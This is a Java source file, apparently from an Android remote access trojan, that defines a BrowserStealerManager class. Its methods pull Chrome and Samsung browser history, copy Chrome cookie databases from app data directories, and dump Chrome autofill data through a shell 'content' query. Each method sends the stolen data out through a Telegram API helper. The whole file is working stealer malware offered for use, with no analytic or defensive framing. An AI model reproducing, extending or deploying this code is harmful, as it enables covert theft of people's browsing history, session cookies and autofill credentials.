package com.enterprise.rat.commands;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import com.enterprise.rat.utils.TelegramApi;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class BrowserStealerManager {
    private Context context;

    public BrowserStealerManager(Context context) { this.context = context; }

    public void stealChromeHistory() {
        StringBuilder sb = new StringBuilder("<b>🌐 Chrome History</b>\n\n");
        try {
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://com.android.chrome.browser/bookmarks"),
                new String[]{"title", "url", "date"}, "bookmark = 0", null, "date DESC LIMIT 40");
            if (cursor != null && cursor.moveToFirst()) {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US);
                do {
                    sb.append("<b>").append(cursor.getString(0)).append("</b>\n<code>").append(cursor.getString(1)).append("</code>\n");
                    sb.append(sdf.format(new Date(cursor.getLong(2)))).append("\n---\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) { sb.append("Chrome provider not accessible.\n"); }
        TelegramApi.sendMessage(sb.toString());
    }

    public void stealChromeCookies() {
        new Thread(() -> {
            try {
                // Requires root or old Android
                String[] paths = {
                    "/data/data/com.android.chrome/app_chrome/Default/Cookies",
                    "/data/data/com.chrome.beta/app_chrome/Default/Cookies",
                    "/data/data/com.chrome.dev/app_chrome/Default/Cookies"
                };
                boolean found = false;
                for (String path : paths) {
                    File cookieFile = new File(path);
                    if (cookieFile.exists()) {
                        TelegramApi.sendFile(cookieFile, "Chrome_Cookies.db");
                        found = true;
                        break;
                    }
                }
                if (!found) TelegramApi.sendMessage("❌ Requires root or older Android.");
            } catch (Exception e) {
                TelegramApi.sendMessage("❌ Cookie error: " + e.getMessage());
            }
        }).start();
    }

    public void stealSamsungHistory() {
        try {
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://com.sec.android.app.sbrowser.browser/bookmarks"),
                new String[]{"title", "url", "date"}, "bookmark = 0", null, "date DESC LIMIT 40");
            StringBuilder sb = new StringBuilder("<b>🌐 Samsung Browser History</b>\n\n");
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    sb.append("<b>").append(cursor.getString(0)).append("</b>\n<code>").append(cursor.getString(1)).append("</code>\n---\n");
                } while (cursor.moveToNext());
                cursor.close();
            }
            TelegramApi.sendMessage(sb.toString());
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Samsung browser not found.");
        }
    }

    public void stealAutofillData() {
        new Thread(() -> {
            try {
                Process p = Runtime.getRuntime().exec(new String[]{
                    "content", "query", "--uri", "content://com.android.chrome.browser/autofill"
                });
                BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
                StringBuilder sb = new StringBuilder("<b>🔑 Chrome Autofill Data</b>\n\n");
                String line;
                while ((line = reader.readLine()) != null) sb.append(line).append("\n");
                p.waitFor();
                TelegramApi.sendMessage(sb.toString());
            } catch (Exception e) {
                TelegramApi.sendMessage("❌ Autofill requires root or old Android.");
            }
        }).start();
    }
}
